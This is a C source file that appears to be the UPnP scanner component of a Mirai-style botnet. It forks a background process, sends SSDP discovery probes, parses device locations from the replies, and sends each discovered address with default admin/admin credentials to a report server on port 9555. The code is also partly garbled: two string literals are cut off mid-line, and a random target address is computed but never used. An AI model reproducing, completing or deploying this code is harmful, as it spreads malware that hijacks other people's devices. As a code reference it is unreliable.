#ifdef SELFREP
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "includes.h"
#include "upnp_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
int upnp_scanner_pid = 0;
int upnp_udp_fd = 0;
uint32_t upnp_fake_time = 0;
int upnp_ranges[] = {185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [%s] %s %d.%d.%d.%d:%d %s\n", 
            time_str, scanner, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, 
            port, details ? details : "");
    fclose(f);
}
static void upnp_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    uint16_t port_net = htons(port);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1;
    if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
static ipv4_t get_random_upnp_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        o1 = upnp_ranges[tmp % (sizeof(upnp_ranges)/sizeof(upnp_ranges[0]))];
        o2 = rand_next() & 0xff;
        o3 = rand_next() & 0xff;
        o4 = rand_next() & 0xff;
        tmp = INET_ADDR(o1, o2, o3, o4);
        if(o1 == 0 || o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224)
            continue;
    } while(tmp == LOCAL_ADDR || tmp == 0 || tmp == 0xffffffff);
    return tmp;
}
static void upnp_parse_response(char *buf, int len, struct sockaddr_in *from)
{
    char *location = strstr(buf, "LOCATION:");
    if(!location) return;
    char *http = strstr(location, "http:
    if(!http) {
        http = strstr(location, "HTTP:
        if(!http) return;
    }
    char *ip_start = http + 7;
    char *ip_end = strchr(ip_start, ':');
    if(!ip_end) ip_end = strchr(ip_start, '/');
    if(!ip_end) return;
    char ip_str[16];
    int ip_len = ip_end - ip_start;
    if(ip_len > 15) ip_len = 15;
    memcpy(ip_str, ip_start, ip_len);
    ip_str[ip_len] = 0;
    ipv4_t target_ip = inet_addr(ip_str);
    if(target_ip == 0 || target_ip == 0xffffffff) return;
    uint16_t port = 80;
    if(*ip_end == ':') {
        char *port_start = ip_end + 1;
        char *port_end = strchr(port_start, '/');
        if(port_end) {
            char port_str[6];
            int port_len = port_end - port_start;
            if(port_len > 5) port_len = 5;
            memcpy(port_str, port_start, port_len);
            port_str[port_len] = 0;
            port = atoi(port_str);
            if(port == 0) port = 80;
        }
    }
    log_event("UPnP", "Found device", target_ip, port, "from SSDP response");
    upnp_report(target_ip, port, "admin", "admin");
}
void upnp_scanner(void)
{
    upnp_scanner_pid = fork();
    if(upnp_scanner_pid > 0 || upnp_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    upnp_udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(upnp_udp_fd < 0) exit(1);
    int opt = 1;
    setsockopt(upnp_udp_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in bind_addr;
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = 0;
    bind(upnp_udp_fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(UPnP_MCAST_ADDR);
    mreq.imr_interface.s_addr = INADDR_ANY;
    setsockopt(upnp_udp_fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));
    fcntl(upnp_udp_fd, F_SETFL, O_NONBLOCK | fcntl(upnp_udp_fd, F_GETFL, 0));
    const char *msearch = 
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "ST: ssdp:all\r\n"
        "MX: 3\r\n"
        "\r\n";
    struct sockaddr_in mcast_addr;
    mcast_addr.sin_family = AF_INET;
    mcast_addr.sin_addr.s_addr = inet_addr(UPnP_MCAST_ADDR);
    mcast_addr.sin_port = htons(UPnP_MCAST_PORT);
    char recv_buf[2048];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    while(TRUE)
    {
        ipv4_t target_ip = get_random_upnp_ip();
        sendto(upnp_udp_fd, msearch, strlen(msearch), 0,
               (struct sockaddr *)&mcast_addr, sizeof(mcast_addr));
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(upnp_udp_fd, &read_fds);
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        if(select(upnp_udp_fd + 1, &read_fds, NULL, NULL, &tv) > 0)
        {
            if(FD_ISSET(upnp_udp_fd, &read_fds))
            {
                int recv_len = recvfrom(upnp_udp_fd, recv_buf, sizeof(recv_buf) - 1, 0,
                                       (struct sockaddr *)&from, &from_len);
                if(recv_len > 0)
                {
                    recv_buf[recv_len] = 0;
                    upnp_parse_response(recv_buf, recv_len, &from);
                }
            }
        }
        usleep(rand_next() % 500000 + 100000);
    }
    close(upnp_udp_fd);
    exit(0);
}
void upnp_kill(void)
{
    if(upnp_scanner_pid > 0)
    {
        kill(upnp_scanner_pid, 9);
        upnp_scanner_pid = 0;
    }
}
#endif
